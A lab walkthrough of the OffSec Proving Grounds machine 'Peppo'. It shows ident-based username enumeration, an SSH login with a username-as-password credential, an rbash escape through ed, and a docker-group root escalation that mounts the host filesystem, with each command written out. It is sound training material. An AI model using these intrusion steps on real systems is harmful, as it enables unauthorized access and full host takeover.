---
title: "PG: Peppo"
date: 2023-04-27
draft: false
os: "Linux"
difficulty: "Hard"
platform: "OffSec Proving Grounds"
aliases: ["/posts/offsec/peppo/"]
tags:
  - offsec
  - proving-grounds
  - hard
  - linux
  - ident
  - weak-credentials
  - rbash-escape
  - docker-privesc
  - gtfobins
categories:
  - walkthrough
---

{{< box-info name="Peppo" os="Linux" difficulty="Hard" ip="192.168.100.60" platform="OffSec Proving Grounds" >}}

---

## Enumeration

### Nmap

{{< collapse title="Nmap output" >}}
```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
113/tcp  open  ident
5432/tcp open  postgresql PostgreSQL DB 12.3 - 12.4
8080/tcp open  http       WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))
```
{{< /collapse >}}

Four services, and most of them are noise. The Redmine app on 8080 and PostgreSQL on 5432 both look inviting but lead nowhere. The pivotal service is the easy-to-overlook one: `ident` on port 113.

### Port 8080 / 5432 - rabbit holes

Redmine (WEBrick 1.4.2) accepts `admin:admin`, but the instance is empty and WEBrick 1.4.2 has nothing exploitable. PostgreSQL is externally reachable with default `postgres:postgres`, but it holds no data either. Both are designed to burn time — note them and move on.

### Port 113 - ident

Port 113 is the [Identification Protocol (RFC 1413)](https://www.rfc-editor.org/rfc/rfc1413) — an auth service that answers "which local user owns this TCP connection?" A raw probe confirms it's alive:

```
$ nc -nv 192.168.100.60 113
(UNKNOWN) [192.168.100.60] 113 (auth) open

0 , 0 : ERROR : INVALID-PORT
```

That makes it a free username oracle. Nmap's `auth-owners` script (pulled in by `-sC`) queries ident for the owner of each open port and hands back the service accounts:

```bash
nmap -sC 192.168.100.60
# ident leaks the owning user per service:
#   ssh -> root
#   other service -> eleanor
```

`eleanor` is a valid local username, served up for free. That's the whole point of this box.

---

## Foothold

### SSH weak credentials

With a confirmed username and OpenSSH exposed, the obvious first swing is a reused/weak password — username as the password. It lands:

```bash
ssh eleanor@192.168.100.60
# password: eleanor
```

We're in — but into a restricted shell (`rbash`), so the fun isn't over.

### Escaping rbash via ed

`rbash` blocks `cd`, path-qualified binaries, and redirection. Looking around, `/home/eleanor/bin` lists the binaries we're allowed to run, and `ed` — the standard line editor — is in there. `ed` can shell out with `!`, and any subshell it spawns is a full unrestricted `bash`:

```bash
ed
!'/bin/bash'
```

Out of the cage. Fix the neutered `PATH` so normal binaries resolve again:

```bash
export PATH=/bin:/usr/bin:/home/eleanor:/home
```

Enumerating the account shows `eleanor` is in the `docker` group — and Docker is installed.

---

## Privilege Escalation

### Docker group is root

Membership in the `docker` group is effectively root: the Docker daemon runs as root, and any group member can ask it to run a container that bind-mounts the host filesystem. [GTFOBins' docker entry](https://gtfobins.github.io/gtfobins/docker/) is the classic play — mount the host's `/` into a throwaway container, `chroot` into it, and you're root on the host:

```bash
# any local image works — reuse whatever docker images lists (here, redmine)
docker ps
docker images

docker run -v /:/mnt --rm -it redmine chroot /mnt sh
```

`-v /:/mnt` maps the real root filesystem into the container at `/mnt`; `chroot /mnt sh` drops into a shell that *is* the host, running as uid 0. Game over.

---

## Proof

{{< terminal title="root@peppo" >}}
$ docker run -v /:/mnt --rm -it redmine chroot /mnt sh
# whoami
root
{{< /terminal >}}

---

## Key Takeaways

{{< callout type="note" >}}
- Don't skip port 113 — `ident` is a free username oracle. `nmap -sC`'s `auth-owners` script leaks the account behind each service, which is exactly how `eleanor` fell out here.
- Weak/reused credentials never die: once you have a valid username, always try the username as the password before anything fancier.
- `rbash` is a speed bump, not a wall. Any allowed binary that can spawn a subshell (`ed`, `vi`, `less`, `man`, …) breaks you out — then just repair `PATH`.
- The `docker` group equals root. `docker run -v /:/mnt --rm -it <image> chroot /mnt sh` bind-mounts the host and hands you a root shell. Always check group membership after landing a foothold.
{{< /callout >}}
